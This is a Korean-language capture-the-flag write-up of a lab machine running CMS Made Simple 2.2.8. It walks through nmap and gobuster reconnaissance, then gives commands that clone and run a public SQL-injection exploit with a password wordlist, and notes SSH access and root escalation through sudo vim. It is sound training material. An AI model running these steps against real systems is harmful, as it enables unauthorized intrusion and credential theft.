# solve

- nmap 시 21, 80, 2222 열림
```
# Nmap 7.95 scan initiated Thu Jan  8 22:22:07 2026 as: /usr/lib/nmap/nmap --privileged -sV -sC -oA tcpdetailed 10.48.164.207                
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)                                           
|      Connected to ::ffff:192.168.130.66
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit 
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

- gobuster로 숨겨진 페이지 목록 발견
```
└─$ gobuster dir -u 10.48.164.207 -w /usr/share/dirb/wordlists/common.txt -t 100
===============================================================
[+] Url:                     http://10.48.164.207
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 297]
/.htaccess            (Status: 403) [Size: 297]
/.hta                 (Status: 403) [Size: 292]
/index.html           (Status: 200) [Size: 11321]
/robots.txt           (Status: 200) [Size: 929]
/server-status        (Status: 403) [Size: 301]
/simple               (Status: 301) [Size: 315] [--> http://10.48.164.207/simple/]
Progress: 4613 / 4613 (100.00%)
===============================================================
```

- robots.txt
```
#
# "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $"
#
#   This file tells search engines not to index your CUPS server.
#
#   Copyright 1993-2003 by Easy Software Products.
#
#   These coded instructions, statements, and computer programs are the
#   property of Easy Software Products and are protected by Federal
#   copyright law.  Distribution and use rights are outlined in the file
#   "LICENSE.txt" which should have been included with this file.  If this
#   file is missing or damaged please contact Easy Software Products
#   at:
#
#       Attn: CUPS Licensing Information
#       Easy Software Products
#       44141 Airport View Drive, Suite 204
#       Hollywood, Maryland 20636-3111 USA
#
#       Voice: (301) 373-9600
#       EMail: cups-info@cups.org
#         WWW: http://www.cups.org
#

User-agent: *
Disallow: /


Disallow: /openemr-5_0_1_3 
#
# End of "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $".
#
```

- `/simple`: cms made simple 이란 cms 있고, 버전은 2.2.8
![[Pasted image 20260109130525.png]]
![[Pasted image 20260109130535.png]]

- cms made simple 2.2.8 은 sqli에 취약하다. exploit db의 페이로드는 python2 기준이라 에러 남. 따서 github에서 페이로드 다운로드 및 실행
```
git clone https://github.com/Dh4nuJ4/SimpleCTF-UpdatedExploit.git
cd SimpleCTF-UpdatedExploit

# 실행
python3 updated_46635.py -u http://10.48.164.207/simple -c -w /usr/share/wordlists/rockyou.txt
```
![[Pasted image 20260109130543.png]]

- ssh 로그인 성공 및 user.txt 읽기 성공
![[Pasted image 20260109130552.png]]

- `vim` 파일을 sudo로 실행하여 root 권한 상승 성공 및 root.txt 읽기 성공 
![[Pasted image 20260109130602.png]]



